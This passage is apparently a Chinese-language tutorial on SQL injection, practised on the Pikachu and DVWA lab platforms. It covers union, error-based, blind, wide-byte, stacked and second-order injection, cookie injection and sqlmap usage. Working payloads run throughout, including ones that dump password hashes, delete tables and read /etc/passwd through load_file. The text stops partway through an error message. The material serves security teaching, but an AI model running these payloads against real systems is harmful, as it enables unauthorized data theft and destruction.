id="1-4-4-xx-型注入">          <a href="#1-4-4-xx-型注入" class="heading-link"><i class="fas fa-link"></i></a>1.4.4. xx 型注入</h3>      <p>xx型是由于 SQL 语句拼接方式不同，注入语句如下：</p><ol><li><p>MySQL 命令端：</p><p>mysql&gt; select * from member where username=(‘xx’) or 1=1 ;（如果()中的参数是数字就不需要 ‘ ‘ 了）</p></li><li><p>pikachu 平台</p><p>xx’) or 1=1 #</p><p>(很显然，要填的值是用 (‘ ‘) 起来的)</p></li></ol>        <h2 id="1-5-提交方式">          <a href="#1-5-提交方式" class="heading-link"><i class="fas fa-link"></i></a>1.5. 提交方式</h2>      <p>ASP：request（全部接受），request.querystring（接受 get ），request.form（接受 post )，request.cookie cookie（接受 cookie ）</p><p>PHP：<code>$_REQUEST</code>（全部接受），<code>$_GET</code>和<code>$_POST</code>（接受 post ），<code>$_cookie</code>（接受 cookie ）</p><p>接受什么方式是由代码来决定的</p>        <h3 id="1-5-1-Get-提交">          <a href="#1-5-1-Get-提交" class="heading-link"><i class="fas fa-link"></i></a>1.5.1.  Get 提交</h3>      <p>Burpsuite 中抓包的 get 方式就在 开头的get 里面修改</p>        <h3 id="1-5-2-Post-提交">          <a href="#1-5-2-Post-提交" class="heading-link"><i class="fas fa-link"></i></a>1.5.2. Post 提交</h3>      <p>Burpsuite 中抓包的 post 都是在最后一行</p><p>Hackbar 插件中用post 提交也可以</p>        <h3 id="1-5-3-Cookie-提交">          <a href="#1-5-3-Cookie-提交" class="heading-link"><i class="fas fa-link"></i></a>1.5.3. Cookie 提交</h3>      <p>Burpsuite 中抓包的 cookie 就是在 cookie 一栏中修改</p>        <h2 id="1-6-注入攻击方式">          <a href="#1-6-注入攻击方式" class="heading-link"><i class="fas fa-link"></i></a>1.6. 注入攻击方式</h2>      <p>主要有 union 注入，insert / update 注入，delete 注入，http header 注入，盲注(base boolion)，盲注(base on time)，函数报错，宽字节注入，二次注入，偏移注入等。</p>        <h3 id="1-6-1-union-注入">          <a href="#1-6-1-union-注入" class="heading-link"><i class="fas fa-link"></i></a>1.6.1. union 注入</h3>      <p>union 操作符用于合并两个或者多个 SQL 语句集合起来，得到联合的查询结果，</p><ol><li><p>SQL 命令：</p><p>mysql&gt; select id,username from member where username=’kevin’ union select email,<br>pw from member where id=1;<br>+——————-+———————————-+<br>| id                | username                         |<br>+——————-+———————————-+<br>| 5                 | kevin                            |<br>| <span class="exturl"><a class="exturl__link" href="mailto:&#118;&#105;&#x6e;&#99;&#x65;&#64;&#112;&#x69;&#x6b;&#97;&#99;&#x68;&#x75;&#46;&#x63;&#111;&#x6d;">&#118;&#105;&#x6e;&#99;&#x65;&#64;&#112;&#x69;&#x6b;&#97;&#99;&#x68;&#x75;&#46;&#x63;&#111;&#x6d;</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> | e10adc3949ba59abbe56e057f20f883e |<br>+——————-+———————————-+<br>2 rows in set (0.00 sec)</p></li><li><p>pikachu 平台</p><p>搜索型注入：v’ union select username,pw from member where id=1#%</p><p><strong>结果报错</strong>：</p><p>The used SELECT statements have a different number of columns</p><p><strong>原因：</strong></p><p>查询的字段不能超过主查询的字段，这个时侯可以在 SQL 语句后加 order by 进行排序，通过这个办法可以判断主查询的字段。</p><p><strong>解决：</strong></p><p>v’ order by 1/2/3/4/… #%</p><p>直到返回报错：Unknown column ‘4’ in ‘order clause’，说明只有3个字段</p><p>再用 union 来做一个 SQL 语句的拼接，输入构造好的语句：</p><p>a’ union select database(),user(),version()#%</p></li></ol>        <h3 id="1-6-2-information-schema-注入">          <a href="#1-6-2-information-schema-注入" class="heading-link"><i class="fas fa-link"></i></a>1.6.2. information_schema 注入</h3>      <p>information_schema 数据库是 MySQL 系统自带的数据库，其中报存着关于 MySQL 服务器所维护的所有其他数据库的信息，通过 information——schema 注入，我们可以将整个数据库内容全部窃取出来，使用 order by 来判断查询的字段，先找出数据库的名称，输入 vince’ union select database(),user(),3#% ，得到反馈：判断数据库名称为 pikachu;</p><p>获取所有数据库的库名：输入：u’ union select 1,2,group_concat(schema_name) from information_schema.schemata#</p><p>获取 pikachu 数据库的表名，输入：u’ union select table_schema,table_name,3 from information_schema.tables where table_schema=’pikachu’#</p><p>获取 member 数据表的字段名，输入：v’ union select table_name,column_name,3 from information_schema.columns where table_name=’member’#</p><p><strong>注意：</strong></p>        <h4 id="1-6-2-1-group-concat-函数">          <a href="#1-6-2-1-group-concat-函数" class="heading-link"><i class="fas fa-link"></i></a>1.6.2.1 group_concat()函数</h4>      <p>利用 group_concat()函数可以得到所有库名，或者同一库名下的所有表名，省去了一个个的麻烦</p><p>函数里面加 schema_name,table_name,column_name 就可以了</p><p>同时，利用 union select group_concat(字段名) from (库名.表名) 可以得到字段内容 </p>        <h3 id="1-6-3-基于函数报错注入">          <a href="#1-6-3-基于函数报错注入" class="heading-link"><i class="fas fa-link"></i></a>1.6.3. 基于函数报错注入</h3>      <ol><li><p>技巧思路</p><p>在 MySQL 中使用一些指定的函数来制造报错，从而从报错信息中获取设定的信息，常见的 select / insert / update 注入都可以使用报错方式来获取信息。</p></li><li><p>背景条件</p><p>后台没有屏蔽数据库报错信息，在语法发生错误时会输出在前端。</p></li><li><p>基于报错的信息获取（三个常用的用来报错的函数）</p><p>1）updatexml()：函数是 MySQL 对 XML 文档数据进行查询和修改的 XPATH 函数。</p><p>2）extractvalue()：函数也是 MySQL 对 XML 文档数据进行查询的 XPATH 函数。</p><p>3）floor()：MySQL 中用来取整的函数。</p></li><li><p>基于报错的信息获取</p><p>UPDATEXML（XML_document，XPath_string，new_value);</p><p>第一个参数：XML_document 是 string 格式，为XML 文档对象的名称，文中为 Doc;</p><p>第二个参数：XPath_string（Xpath 格式的字符串），如果不了解 Xpath 语法，可以在官网上查看教程；</p><p>第三个参数：new_value 也是 string 格式，替换查找到的符合条件的教程。</p></li><li><p>实战测试</p><p>（大多数展现的用 搜索型注入）</p><p>1）<strong>爆破数据库版本信息</strong></p><p>k’ and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)#         注：@@version  换成 version() 也可以</p><p>(这个updatexml 结构和上面的一样，前后两个 1 对应上面的 xml_document 和 new_value,1也可以换成2/3…；concat 是一个拼接函数)</p><p>(SELECT 小写形式也可以)</p><p>2）<strong>爆破数据库当前用户</strong></p><p>k’ and updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)#                     注：后一个 0x7e 也可以是不用写的</p><p>或者：k and extractvalue(1,concat(‘~’,(select database())))%23</p><p>注意：参数后面的 ‘ 有的时候要，有点时候不要，updatexml 函数最后的1是要有的，而extractvalue 函数最后是没有的。</p><p>3）<strong>爆破数据库</strong></p><p>k’ and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)#              注：后一个 0x7e 也可以是不用写的</p><p>4）<strong>爆表</strong></p><p>获取数据库表名，输入：</p><p>k’ and updatexml(1,concat(0x7e,(SELECT table_name from information_schema.tables where table_schema=’pikachu’)),0)#，但是返回错误信息，表示只能显示一行，所以用 limit 来一行一行显示（就是无法批量的把表名显示出来）</p><p>更改输入：</p><p>k’ and updatexml(1,concat(0x7e,(SELECT table_name from information_schema.tables where table_schema=’pikachu’ limit 0,1)),0)#，更改 limit 后面的数字 limit 0 完成表名遍历。</p><p>(0是可以变化的，0是第一个表名，1是第二个表名，以此类推；后面的1代表一次一行)</p><p>5）<strong>爆字段</strong></p><p>获取字段名，输入：</p><p>k’ and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=’users’ limit 0,1)),0)#</p><p>6）<strong>爆字段内容</strong></p><p>获取字段内容，输入：</p><p>k’ and updatexml(1,concat(0x7e,(select password from users limit 0,1)),0)#</p><p>返回结果为连接参数产生的字符串，如有任何一个参数为 NULL，则返回值为 NULL；通过查询@@version 返回版本，然后 concat 将其字符串化。因为 updatexml 第二个参数需要 Xpath 格式的字符串，所以不符合要求然后报错。</p></li></ol>        <h3 id="1-6-4-insert-注入">          <a href="#1-6-4-insert-注入" class="heading-link"><i class="fas fa-link"></i></a>1.6.4. insert 注入</h3>      <p>insert 注入，就是前端注册的信息最终通过 insert 这个操作插入数据库，后台在接受前端的注册数据时没有做防 SQL 注入的处理，导致前端的输入可以直接 SQL 到后端的 insert 相关的内容中，导致了 insert 注入。</p><ol><li><p>到 MySQL 命令端中输入：</p><p>insert into member (username,pw,sex,phonenum,email,address) values(‘haoye’,123456,1,2,3,4); 来在表里插入一个用户；</p><p>再输入 select * from member; 来查看所有用户。</p></li><li><p>进入网站注册页面，填写网站注册相关的信息，通过 Burp 抓包在用户名输入相关的 payload ，格式如下：</p><p>haoye’ or updatexml(1,concat(0x7e,(命令)),0) or ‘</p><p>1）<strong>爆表名</strong></p><p>haoye’ or updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=’pikachu’ limit 0,1)),0) or’</p><ol><li><p>抓包注册页面，发送到 repeater 界面，修改如下：</p><p>username=haoye’or updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=’pikachu’ limit 0,1)),0) or’&amp;password=111&amp;sex=&amp;phonenum=&amp;email=&amp;add=&amp;submit=submit</p></li><li><p>response 最后一行获得：</p><p>XPATH syntax error: ‘~httpinfo’</p></li><li><p>或者可以不用发送到 repeater 页面，直接在 intercept 抓到的包处修改，然后 forward 发送，这样 pikachu 的页面跳转就会显示。</p></li><li><p>注意：这里用 or 的比较多，and 其实也行，但是 or 保证了在即使前面有问题，后面一定为 真，不会导致报错。</p></li></ol><p>2）<strong>爆字段名</strong></p><p>haoye’ or updatexml(1,concat(0x7e,(select table_column from information_schema.columns where table_name=’users’ limit 0,1)),0) or’</p><p>3）<strong>爆字段内容</strong></p><p>haoye’ or updatexml(1,concat(0x7e,(select password from users limit 0,1)),0) or’ 等同</p><p>haoye’ or updatexml(1,concat(0x7e,(select password from users limit 0,1)),0) or ‘1’=’1’’</p></li></ol>        <h3 id="1-6-5-update-注入">          <a href="#1-6-5-update-注入" class="heading-link"><i class="fas fa-link"></i></a>1.6.5. update 注入</h3>      <p>与 insert 注入方法大体相同，区别在于 update 用于用户登录端，insert 用于用户注册端。</p><p>一般登录网站前台或后台更新用户信息的地方，填写用户需要修改的相关信息，通过 Burp 抓包在用户名输入相关的 payload，格式如下：</p><p>update 注入：’ or updatexml(0,concat(0x7e,(select database())),0) or’</p><p><strong>操作：</strong></p><p>注册用户，再登录，然后修改信息，信息随便填，然后在提交的时候抓包</p><p>修改如下：sex=11&amp;phonenum=11’or updatexml(0,concat(0x7e,(select database())),0) or’&amp;add=11&amp;email=11&amp;submit=submit</p><p>获得：XPATH syntax error: ‘~pikachu’</p><p><strong>注意：</strong></p><p>有的时候，后端人员会设置过滤，所以我们在注入时可以换成 url 编码，（选中 payload 然后 ctrl+u ，就可以看到把空格换成了+号）</p>        <h3 id="1-6-6-delete-注入">          <a href="#1-6-6-delete-注入" class="heading-link"><i class="fas fa-link"></i></a>1.6.6. delete 注入</h3>      <p>一般应用于前后端发帖，留言，用户等相关删除操作，点击删除按钮可通过 Burp 抓包，对数据包相关 delete 参数进行注入，</p><p>注入方法如下：delete from message where id=56 or updatexml(2,concat(0x7e,(select database())),0)</p><p><strong>Hackbar 操作：</strong></p><p>输入留言版信息，提交后，复制 “删除” 的链接，在 Hackbar 中 URL 中输入：<span class="exturl"><a class="exturl__link" href="http://192.168.133.133:81/pikachu/vul/sqli/sqli_del.php?id=58">http://192.168.133.133:81/pikachu/vul/sqli/sqli_del.php?id=58</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> or updatexml(2,concat(0x7e,(database())),0)</p><p>点击 Execute 获得：XPATH syntax error: ‘~pikachu’</p>        <h3 id="1-6-7-Http-Header-注入">          <a href="#1-6-7-Http-Header-注入" class="heading-link"><i class="fas fa-link"></i></a>1.6.7. Http Header 注入</h3>      <p>先在 pikachu 平台打开 http header 注入模块，点击查看登录账号和密码，登录后去 Burp 中找到登录地 GET 请求，把请求发送到 Repeater 模块中，去除 User-Agent:，然后输入 ‘，然后运行观察 MySQL 语法报错然后发现存在 SQL 注入漏洞，这时候可以设置 payload 。在 User-Agent 输入 payload Mozilla’ or updatexml(1,concat(0x7e,database()),0) or’</p><p>(注意：在 Repeater 模块中数据可以发送到 Intruter 模块中，然后在positions中对单一的参数进行 And$，再在 payload中对参数导入可能的库值，进行暴力破解)</p>        <h3 id="1-6-8-Cookie-注入">          <a href="#1-6-8-Cookie-注入" class="heading-link"><i class="fas fa-link"></i></a>1.6.8. Cookie 注入</h3>      <p>Cookie 是网站为了识别用户身份来跟踪会话的，虽然 Cookie 是由后端生成的，但每次页面跳转，后端都对前端的 Cookie 的信息进行验证，但如果后端获取 Cookie 后放在数据库中进行拼接，那么这也将是一个 SQL 注入点。在 ant[uname]=admin 后添加一个 ‘  来观察反馈的 MySQL 的语法报错，发现了存在 SQL 漏洞，在设置 Payload ‘ and updatexml(1,concat(0x7e,database()),0)#，观察报错和之前是否相同。</p>        <h3 id="1-6-9-Boolian（布尔型）盲注">          <a href="#1-6-9-Boolian（布尔型）盲注" class="heading-link"><i class="fas fa-link"></i></a>1.6.9. Boolian（布尔型）盲注</h3>      <p>在我们注入语句被带入数据库查询单却社么都没有返回的情况下我们该怎么办？例如应用程序就会返回一个”通用的” 的页面，或者重定向一个通用页面（可能为网站首页），这时，我们之前学习的 SQL 注入办法就无法使用了。</p><p>盲注：即在 SQL 注入过程中，SQL 语句执行选择后不能回显到前端，我们需要使用一些特殊的方法进行判断或尝试，这个过程称为盲注。</p><p><strong>SQL 注入分为三大类</strong>：基于布尔型 SQL 盲注，基于时间型 SQL 盲注，基于报错型 SQL 盲注。</p><p>采用 SQL 语句中 and 方法，返回正确或错误来构造，按照之前的思路来构造一个 SQL 拼接：vince’ and extractvalue(0,concat(0x7e,version()))# ，输入后根据返回的信息判断之前的思路不再适用。（都显示username 不存在）</p><p>MySQL命令端，输入语句：select ascii(substr(database(),1,1))&gt;x;   ，通过对比 ascii 长度，判断出数据库名的第一个字符。</p><p><strong>注：substr()函数</strong></p><p>substr(string,start,length)</p><p>string(必需)规定要返回其中一部分的字符串，start(必需)规定在字符串的何处开始，length(可选)规定被返回字符串的长度。</p><p>那么通过这个方法，虽然只能通过判断单个字符，我们同样可以使用 length 来判断表名的长度，判断出长度后就能多次输入 payload 来爆破出每一个表名的字符，</p><ol><li><p>MySQL 命令端，输入语句：</p><p>select length(database())&lt;x;    x是长度值 1/2/3… 以此类推，返回1为真，返回0为假，以此来判断长度。</p></li><li><p>pikachu 平台</p><p>我们构造语句，如果返回1，就会爆出选择的信息；如果爆出0，就会返回“你输入的 username 不存在”。按照之前的逻辑，输入 SQL 语句：</p><p>vince’ and ascii(substr(database(),1,1))=112#  ，通过这个方法就能得到后台数据库的名称的第一个字符的 ascii 码。同之前的办法，我们也可以获得 information_schema.tables 里面的数据。但在实际操作中通常不会使用手动盲注的办法，可以使用 sqlmap 等工具来增加盲注的效率。</p><p>1）查询数据表个数：vince’ and (select count(table_name) from information_schema.tables where table_schema=’pikachu’)=5#                （5的时候没有保错）</p><p>2）查询第一个表名的长度：vince’ and length(substr((select table_name from information_schema.tables where table_schema=’pikachu’ limit 0,1),1))=8#              （8 的时候没有保错）</p><p>3）查询第一个表名的第一字母：vince’ and ascii(substr((select table_name from information_schema.tables where table_schema=’pikachu’ limit 0,1),1))=104#</p><p>4）查询第一个表名的第二字母：vince’ and ascii(substr((select table_name from information_schema.tables where table_schema=’pikachu’ limit 0,1),2))=116#              （注：0代表第几个表，1代表字符长度，2代表第几个字母）</p><p>5）下面的列也是同理</p></li></ol>        <h3 id="1-6-10-Base-on-time-时间型-盲注">          <a href="#1-6-10-Base-on-time-时间型-盲注" class="heading-link"><i class="fas fa-link"></i></a>1.6.10. Base on time(时间型)盲注</h3>      <p>到 base on time 盲注下，输入上个演示中设置好的 payload：vince’ and ascii(substr(database(),1,1))=112#    ，返回的信息发现不存在注入点，那这样就不能进行注入了？但其实可以通过后端的执行时间来进行注入。这里会用到 payload：vince’ and sleep(x)#</p><p>基于时间的延迟，构造一个拼接语句：vince’ and if(substr(database(),1,1)=’x’,sleep(10),null)#    其中’x’ 中的 x 为猜测字符，如果猜测正确，那么就会响应10秒；如果错误，就会立刻返回错误；这样我们就可以逐级向下获取数据。（弊端：这个很麻烦，得一个个逐级向下判断）</p><p>它的拼接语句和 布尔型的有点类似，我决定也差不多就是多了个 if 的判断条件，从而利用 sleep 来判断是否正确。</p>        <h3 id="1-6-11-宽字节注入">          <a href="#1-6-11-宽字节注入" class="heading-link"><i class="fas fa-link"></i></a>1.6.11. 宽字节注入</h3>      <p>下列使用了URL 编码转换</p><p>当我们把 php.ini 文件里面的 magic_quotes_gpc 参数设为 ON 时，所有  ‘（单引号），”（双引号），\（反斜杠）和 null 字符都会被自动加上一个反斜杠进行转义。还有很多函数有类似的作用，如：addslashes()，mysql_escape_string()，mysql_real_escape_string()等。另外还有 parse_str() 后的变量也受 magic_quotes_gpc 的影响。目前大多数的主机都打开了这个选项，并且很多程序员也注意使用上面那些函数去过滤变量，这看上去很安全，很多漏洞查找者或者工具遇到这些函数过滤后的变量直接放弃，但是就在他们放弃的同时也放弃了很多致命的漏洞。</p><p>其中 \ 的十六进制是 %5C ，当我们在 \ 前面加上 %df 的时候，最终就会变成 運，如果程序默认的字符集是 GBK 等宽字节字符集，则 MySQL 用 GBK 的编码时，会认为 %df 是一个宽字符，也就是 <strong>運</strong>；也就是说：<code>%df\&#39;</code>= %df%5c%27=運’ ，有了单引号就好注入了。</p><p>‘=======&gt;&#39; 单引号转义后占两个字节，所以我们需要通过 繁体字%df 构造两个字节，最终用 <strong>運</strong> 干掉了 <code>\</code> ，也就是说被 <strong>運</strong> 占领了 \ ，所以在最后页面显示 SQL 语句的地方不会显示 \ 。</p><p>(小提示：数字和字母占一个字节，汉字占两个字节)</p><p>哪些地方没有魔术引号的保护？</p><ol><li><p><code>$_SERVER</code> 变量</p><p>PHP5 的 <code>$_SERVER</code> 变量缺少 magic_quotes_gpc 的保护，导致近年来 X-Forwarded-For 的漏洞猛爆，所以很多程序员考虑过滤 X-Forwarded-For(代理)，但是其他变量呢？</p></li><li><p><code>getenv()</code> 得到的变量（使用类似 <code>$_SERVER</code> 变量 ）</p></li><li><p><code>$HTTP_RAW_POST_DATA</code> 与 PHP 输入，输出流</p></li></ol><p>**总结： **</p><p>但我们输入 id=值后，显示的 SQL语句发现自动加上了 \ ，就可以通过 %df 来使得其成为繁体字 <strong>運</strong> 。</p>        <h3 id="1-6-12-堆叠注入">          <a href="#1-6-12-堆叠注入" class="heading-link"><i class="fas fa-link"></i></a>1.6.12. 堆叠注入</h3>      <p>堆叠注入为攻击者提供了很多控制权，与仅限于SELECT语句的UNION联合查询攻击不同，<strong>堆叠注入可以用于执行任何SQL语句。</strong></p><p><strong>堆叠注入原理</strong></p><p>在sql中，分号表示一条语句的结束。如果在分号的后面再加一条语句，这条语句也可以被执行，继续加一个分号和一条语句，这样就可以在一次数据库的调用中执行多个语句。</p><p>举个堆叠注入攻击的例子：</p><p>执行查询时，第一个语句执行信息查询，第二个语句则将表user的所有内容给删除了，如下代码：</p><p><code>mysql&gt; select * from users where id =1;delete from users;</code></p><p>注入形式：<code>1&#39;;show databases;show tables;#</code></p><p><strong>堆叠注入的局限性</strong></p><p>堆叠注入并不是在每种情况下都能使用的。大多数时候，因为API或数据库引擎的不支持，堆叠注入都无法实现。</p>        <h2 id="2-1-二阶-SQL-注入">          <a href="#2-1-二阶-SQL-注入" class="heading-link"><i class="fas fa-link"></i></a>2.1. 二阶 SQL 注入</h2>      <p>一种特别的有意避开过滤的方法与二阶 SQL 注入(second-order SQL injection) 有关。当数据首次插入数据库中时，许多应用程序能够安全处理这些数据。但是，一但数据存储在数据库中，随后应用程序本身或其他后端进程可能会以危险的方式处理这些数据。许多这类应用程序并不像面向因特网的主要应用程序一样安全，却拥有较高权限的数据库账户。</p><ol><li><p>在一些应用程序中，用户输入在到达时通过转义单引号来进行确认，在前面搜索书籍的示例中，这种方法明显有效。当用户输入搜索项 0’ Reilly 时，应用程序执行以下查询：</p><p>SELECT author,title,year FROM books WHERE publisher=’0’ ‘Reilly’（这样SQL注入语句就可以写在 Reilly 的地方了）</p><p>在这个查询中，用户提交的单引号被转义成两个单引号，因而传递给数据库的搜索项与用户最初输入的表达式具有相同的字符含义。</p></li><li><p>与单引号配对方法有关的问题出现在更复杂的情形中，此时同一个数据项被提交给几个SQL查询，然后写入数据库被几次读取。这是证明简单输入确认相对于边界确认存在不足的一个示例。<br>回到前面那个允许用户自我注册并且在一个INSERT语句中存在SQL注入漏洞的应用程序。假设开发者将修复出现在用户数据中的所有单引号配对导致的漏洞。注册用户名fool来建立如下查询，它不会在数据库中造成问题：</p><p>INSERT INTO users (username,password,ID,privs)VALUES(‘foo’’’,’secret’,2248,1)</p></li><li><p>目前为止一切正常。然而，假设应用程序还执行密码修改功能，那么只有通过验证的用户才能够访问这项功能，而且为了加强保护，应用程序要求用户提交原始密码。然后应用程序从数据库中提取用户的当前密码，并对两个字符串进行比较，核对用户提供的密码是否正确。要完成核对任务，它首先要从数据库提取用户的用户名，然后建立如下查询:<br>SELECT password FROM users WHERE username=’foo’’</p></li><li><p>因为保存在数据库中的用户名是字面量字符串foo’ ，当应用程序提出访问要求时，数据库即返回这个值，只有在字符串被传送给数据库时才使用配对的转义序列。因此，当应用程序重复使用这个字符串并将它嵌人到另一个查询中时，就会造成一个 SQL注人漏洞，用户最初的恶意输人就被嵌人到查询中。当用户尝试修改密码时，应用程序返回以下消息，暴露了上述缺陷:</p><p>Unlosed quotation mark before the character string’foo</p></li><li><p>要利用这种漏洞，攻击者只需注册一个包含专门设计的输入用户名，然后尝试修改密码。例如，如果注册如下用户名：</p><p>‘or 1 in(select password from users where username=’admin’)–</p></li><li><p>注册步骤将会被应用程序安全处理。如果攻击者尝试修改密码，他注入的查询就会执行，导致生成以下消息，泄露管理员密码：</p><p><code>Microsoft OLE DB Provider for ODBC Drivers error&#39;80040e07&#39;</code></p><p><code>[Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting</code></p><p><code>the varchar value&#39; fm69&#39; to a column of data type int.</code></p></li></ol><p>攻击者已经成功避开旨在阻止 SQL注入攻击的输入确认，现在他能够在数据库中执行任意查询并获得查询结果。</p>        <h2 id="2-2-Cookie-注入">          <a href="#2-2-Cookie-注入" class="heading-link"><i class="fas fa-link"></i></a>2.2. Cookie 注入</h2>      <p>大家都知道注入分为：GET，POST，COOKIE注入，当一个站增加了防注入程序后，很多朋友都会放弃，其实可以试试 COOKIE注入，下面实例就是对 GET 和 POST 做了防注入，但忘了 COOKIE 注入。在演示前先了解一下 ASP 和 PHP 数据提交方式。</p><p>ASP：request（全部接受），request.querystring（接受 get ），request.form（接受 post )，request.cookie cookie（接受 cookie ）</p><p>PHP：<code>$_REQUEST</code>（全部接受），<code>$_GET</code>和<code>$_POST</code>（接受 post ），<code>$_cookie</code>（接受 cookie ）</p>        <h3 id="2-2-1-实例">          <a href="#2-2-1-实例" class="heading-link"><i class="fas fa-link"></i></a>2.2.1. 实例</h3>      <p><strong>方法一：</strong></p><p>用 Burp 进行拦截</p><p>把 GET 头中的 id=n 后面加 ‘ ，然后 send ，如果接受后的显示 script 这类的字样出现，说明被拦截了；然后把 id=n’ 删除，然后添加到 cookie 中，先在原来的末尾加 ; 然后把这个 id=n’ 添加到末尾</p><p>然后，后面就可以进行一些注入查询，例如：</p><p>;id=n’%20order%20by%201,2,3…进行字段长度的查询之类的，然后再进行 union select 的联合查询</p><p>注：content-length：16xxx 是一般正确的数据包长度，像什么1524之类的是错误的</p><p><strong>方法二：</strong></p><p>通过注入中转器工具进行 cookie 注入，这个工具针对于 ASP ，PHP 一般用 sqlmap。</p><p>cookie 注入时：</p><p>注入键名：id=（这里也有可能是别的名称）</p><p>注入 URL 地址：…asp</p><p>POST 提交值：jmdcw=n（这里的 n 是id 后面的参数）</p><p>当生成 ASP 后，就会多出来一个文件，这个就是注入文件</p><p>我们再在 URL 中访问时，就不是id=参数值，而是 jmdcw=参数值。</p><p><strong>方法三：</strong></p><p>利用 Pangolin 穿山甲 SQL注入工具</p><p>直接在 URL 中填写注入站点，然后 cookie 注入就可以了。</p><p><strong>方法四：</strong></p><p>利用 Sqlmap 注入：</p><p><strong>get注入：</strong>进入 Sqlmap 的物理路径进行 cmd ，&gt;sqlmap.py -u “注入站点.asp?id=参数值”</p><p><strong>post注入：</strong>进入 Sqlmap 的物理路径进行 cmd ，&gt;sqlmap.py -u “注入站点.asp” –data “id=参数值”</p><p><strong>cookie注入：</strong>进入 Sqlmap 的物理路径进行 cmd ，&gt;sqlmap.py -u “注入站点.asp” –cookie “id=参数值” –level 2   （默认 level 是1，当 cookie 注入时要&gt;=2，最高是5）</p>        <h2 id="3-1-MySQL-实战-Webshell">          <a href="#3-1-MySQL-实战-Webshell" class="heading-link"><i class="fas fa-link"></i></a>3.1. MySQL 实战 Webshell</h2>      <p>以下操作使用到 DVWA</p>        <h3 id="3-1-1-使用-order-by-查询字段">          <a href="#3-1-1-使用-order-by-查询字段" class="heading-link"><i class="fas fa-link"></i></a>3.1.1. 使用 order by 查询字段</h3>      <p>我们需要通过 MySQL 语句进一步的进行测试，开始使用 order by ，order by 语句可以对查询结果进行排列，上面的语句中有两列，使用 order by 语句可以按照第一列 first_time 或者第二列 last_name 对结果进行排列。假如我们想根据第三列结果进行排序，因为查询语句中不存在第三列，就会产生报错：</p><p>ERROR 1054 (42S22)：Unknown column ‘3’ in ‘order clause’</p><p>当我们使用 order by 2 的时候没有产生任何错误，而是用 order by 3的时候产生报错就说明数据库中只用两列，通过这种方法我们可以使用 order by 语句猜测数据库表中的列数。</p><ol><li><p>MySQL 命令行输入：</p><p>select first_name,last_name from user where user_id=” order by 2+-+’</p></li><li><p>DVWA 中 SQL注入，输入：</p><p>1’ order by 1,2 –</p></li></ol>        <h3 id="3-1-2-使用联合查询来查询当前数据库，用户，版本信息">          <a href="#3-1-2-使用联合查询来查询当前数据库，用户，版本信息" class="heading-link"><i class="fas fa-link"></i></a>3.1.2. 使用联合查询来查询当前数据库，用户，版本信息</h3>      <p>继续构造 union select 语句，来查询正在使用中的用户 user()，数据库 database()，数据库版本 version()，服务器操作系统 @@version_compile_os，用以下语句：</p><p>‘union select user(),database()+–+（–相当于#，注释；+是空格）</p>        <h3 id="3-1-3-获取表名，字段，值">          <a href="#3-1-3-获取表名，字段，值" class="heading-link"><i class="fas fa-link"></i></a>3.1.3. 获取表名，字段，值</h3>      <p>前面说过 MySQL5.0 以上，information_schema 存储所有数据库下的表名和列名信息，下面我们就来查询 information_schema 数据库名下的表名 tables 的信息（条件：table_schema=0x64767761 dvwa的十六进制）</p><p>information_schema.tables：information_schema 数据库名下表名 tables 记录所有数据库名下的所有表名信息。</p><p><span class="exturl"><a class="exturl__link" href="http://192.168.133.129/dvwa/vulnerabilities/sqli/?id=1&#39;">http://192.168.133.129/dvwa/vulnerabilities/sqli/?id=1&#39;</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> union select 1,group_concat(table_name) from information_schema.tables where table_schema=0x64767761+–+&amp;Submit=Submit</p>        <h3 id="3-1-4-MySQL-root-用户密码存储位置">          <a href="#3-1-4-MySQL-root-用户密码存储位置" class="heading-link"><i class="fas fa-link"></i></a>3.1.4. MySQL root 用户密码存储位置</h3>      <p>数据库最高权限是 root 密码保存在 MySQL 数据库 user 表里，密码是采用 MySQL5.0 特有的加密，通过 cmd5 网站进行解密或通过 cain 这类专业可以对 MySQL hash 破解，所以对数据库做安全的时候无论如何不能给网站 root 权限，一定要给一个普通用户权限。</p>        <h3 id="3-1-5-对服务器文件进行读写操作（前提条件）">          <a href="#3-1-5-对服务器文件进行读写操作（前提条件）" class="heading-link"><i class="fas fa-link"></i></a>3.1.5. 对服务器文件进行读写操作（前提条件）</h3>      <ol><li><p>使用 into outfile 需要有以下条件：</p><p>1）需要知道远程目录</p><p>2）需要远程目录有写权限</p><p>3）需要数据库开启 secure_file_priv</p></li><li><p>数据库开启 secure_file_priv</p><p>into outfile 可以将 select 的结果写入到指定目录下的 txt 中，但需要数据库开启 secure_file_priv，怎么开启 secure_file_priv。</p><p>1）在 MySQL 安装目录的 php.ini 文件中的 [mysqld] 添加 secure_file_priv=’’;  </p><p>2） 然后以管理员的身份运行 cmd，进入 mysql/bin 停止 mysql 服务：net stop mysql；</p><p>3）重新启动 mysql 服务：net start mysql ；</p><p>4）登入 mysql：mysql -u root -p enter password:password ；</p><p>5）执行命令：show variables like ‘%secure%’ ；查看 secure_file_priv 的值（这里已经将 secure_file_priv 的值设为空，但正常显示为 NULL 和文件路径，只有value 下对应的为空才能读写操作），显示以下界面说明可以对服务器进行读写操作。</p></li><li><p>通过联合查询对服务器进行读写操作</p><p>1）使用联合查询语句构造，利用注入读取 /etc/passwd 文件（Linux系统）</p><p>‘UNION SELECT 1,load_file(/etc/passwd)+–+</p><p>2）使用联合查询语句构造，利用注入读取 c:\1.txt（Windows系统）</p><p><code>&#39;UNION SELECT 1,load_file(&#39;c:\\1.txt&#39;)+--+</code>或者</p><p><code>union select 1,load_file(&#39;c:/1.txt&#39;)+--+</code></p><p>注：“ \ ” （编程里面 “ \ ” 转义,为什么要俩个，因为有一个要被转义）</p><p><code>http://192.168.133.129/dvwa/vulnerabilities/sqli/?id=1%27%20union%20select%201,load_file(&#39;c:\\boot.ini&#39;)+--+&amp;Submit=Submit</code></p><p>3）如果出现以下报错：</p><p><code>Query Error:SELECT CID,TITLE FROOM CMS_CONTENTINDEX WHERE TID=25950\&#39; AND 1=2 UNION SELECT 